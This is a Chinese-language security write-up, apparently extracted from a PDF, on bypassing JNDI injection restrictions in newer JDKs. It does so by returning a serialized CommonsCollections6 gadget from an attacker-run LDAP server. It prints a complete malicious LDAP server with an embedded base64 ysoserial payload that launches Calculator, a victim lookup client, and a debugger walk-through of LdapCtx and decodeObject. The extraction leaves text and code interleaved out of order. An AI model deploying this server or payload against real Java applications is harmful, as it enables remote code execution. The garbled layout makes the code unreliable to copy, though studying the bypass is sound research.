JNDI 注⼊利⽤ Bypass ⾼版本 JDK 限制
0x00 前⾔
JNDI 注⼊利⽤⾮常⼴泛但是在⾼版本 JDK 中由于默认 codebase 为 true 从⽽导致客户端默认不会请求远程Server
上的恶意 Class，不过这种⼿法也有 Bypass 的⽅式，本⽂主要学习 KINGX 师傅所提出的两种 Bypass 的⽅法 
KINGX 师傅⽂章链接：https://mp.weixin.qq.com/s/Dq1CPbUDLKH2IN0NA_nBDA
JNDI 注⼊通常利⽤ rmi 、ldap 两种⽅式来进⾏利⽤，其中 ldap 所适⽤的 JDK 版本更加多⼀些
RMI：JDK 8u113、JDK 7u122、JDK 6u132 起 codebase 默认为 true
LDAP：JDK 11.0.1、JDK 8u191、JDK 7u201、JDK 6u211 起 codebase 默认为 true
关于 JNDI 注⼊的⽂章可以看KINGX师傅的
⽂章链接：https://mp.weixin.qq.com/s?__biz=MzAxNTg0ODU4OQ==&mid=2650358440&idx=1&sn=e005f72
1beb8584b2c2a19911c8fef67&chksm=83f0274ab487ae5c250ae8747d7a8dc7d60f8c5bdc9ff63d0d930dca63
199f13d4648ffae1d0&scene=21#wechat_redirect
0x01 Bypass 1：返回序列化Payload，触发本地Gadget
由于在⾼版本 JDK 中 codebase 默认为 true 就导致客户端⽆法请求未受信任的远程Server上的 class，所以既然不
能远程那么就尝试来攻击本地 classpath 
当我们开启⼀个恶意的 Server 并控制返回的数据，由于返回的数据是序列化的，所以当客户端接收到数据之后会
进⾏反序列化操作，那么如果客户端本地存在有反序列化漏洞的组件那么就可以直接触发
Evil LDAP Server
/**
 * In this case
 * Server return Serialize Payload, such as CommonsCollections
 * if Client's ClassPath exists lib which is vulnerability version So We can use it
 * Code part from marshalsec
 */
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.text.ParseException;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import com.unboundid.util.Base64;
public class HackerLdapServer {
    private static final String LDAP_BASE = "dc=example,dc=com";
    public static void main ( String[] args ) {
        int port = 1389;
        try {
            InMemoryDirectoryServerConfig config = new 
InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen", //$NON-NLS-1$
                    InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));
            config.addInMemoryOperationInterceptor(new OperationInterceptor());
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
            ds.startListening();
        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }
    // in this class remove the construct
    private static class OperationInterceptor extends InMemoryOperationInterceptor {
        @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = "Exploit";
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }
        }
        protected void sendResult ( InMemoryInterceptedSearchResult result, String 
base, Entry e ) throws LDAPException, MalformedURLException, ParseException {
            e.addAttribute("javaClassName", "foo");
            // java -jar ysoserial-master-d367e379d9-1.jar CommonsCollections6 'open 
/System/Applications/Calculator.app'|base64
这⾥返回的是 CommonsCollections6 的序列化 payload ，所以本地 classpath 需要有这个包，添加到 pom.xml 
中
Victim Client
            e.addAttribute("javaSerializedData", 
Base64.decode("rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNy
ADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJ
MAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcm
cuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb
3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9u
cy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1
lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcG
FjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY
2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJ
aUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5
jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3
N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyY
W1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhw
AAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXR
ob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAA
AAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4c
HZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AChvcGVuIC9TeXN0
ZW0vQXBwbGljYXRpb25zL0NhbGN1bGF0b3IuYXBwdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZ
hLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeH
AAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/Q
AAAAAAAAHcIAAAAEAAAAAB4eHg="));
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }
}
            commons-collections
            commons-collections
            3.1
package JNDI.LocalGadgetBypass.Client;
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.util.Hashtable;
可以看到意料之内的弹出了计算器
分析
上⾯的 恶意 LDAP Server 中其实最关键的是以下这个函数
可以看到该函数中将序列化payload放到了 javaSerializedData 变量中 
/**
 * codebase: true (means client will not download class from remote Server which is 
unreliable)
 */
public class VictimClient {
    public static void main(String[] args) throws NamingException {
        Hashtable env = new Hashtable<>();
        Context context = new InitialContext(env);
        context.lookup("ldap://127.0.0.1:1389/Exploit"); 
    }
}
        protected void sendResult ( InMemoryInterceptedSearchResult result, String 
base, Entry e ) throws LDAPException, MalformedURLException, ParseException {
            e.addAttribute("javaClassName", "foo");
            // java -jar ysoserial-master-d367e379d9-1.jar CommonsCollections6 'open 
/System/Applications/Calculator.app'|base64
            e.addAttribute("javaSerializedData", Base64.decode("序列化payload"));
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
接下来我们来进⾏正向分析，同时想清楚作者是如何发现 javaSerializedData 这个变量的
因为恶意Server只是返回序列化payload，所以在调试分析中并不是我关注的重点，我所关注的是客户端是如何将
返回的数据进⾏反序列化并进⾏触发，所以我在 lookup 处打了断点
前期我们只需要重点关注 lookup 就⾏了，不断的进⾏跟进 
最后会来到 com.sun.jndi.ldap.LdapCtx#c_lookup，我们这⾥注意到 JAVA_ATTRIBUTES 变量
JAVA_ATTRIBUTES 为⼀个 String 数组，这⾥的 JAVA_ATTRIBUTES[2] 对应的就是 javaClassName ，也就是说如
果 javaClassName 不为 null 那么就会调⽤ Obj.decodeObject 来处理 var4
static final String[] JAVA_ATTRIBUTES = new String[]{"objectClass", 
"javaSerializedData", "javaClassName", "javaFactory", "javaCodeBase", 
"javaReferenceAddress", "javaClassNames", "javaRemoteLocation"};
 这⾥的 var4  就是恶意 Server 所返回的值
跟进 decodeObject 函数，在该函数中对不同的返回值的情况做了不同的处理，这个地⽅⾮常关键我们来仔细分析
⼀下
这三个判断主要针对返回值的不同来进⾏不同的调⽤，其中第⼀个判断就是我们 bypass 的触发点 
    protected void sendResult ( InMemoryInterceptedSearchResult result, String base, 
Entry e ) throws LDAPException, MalformedURLException, ParseException {
        e.addAttribute("javaClassName", "foo");
        e.addAttribute("javaSerializedData", Base64.decode("序列化payload"));
        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));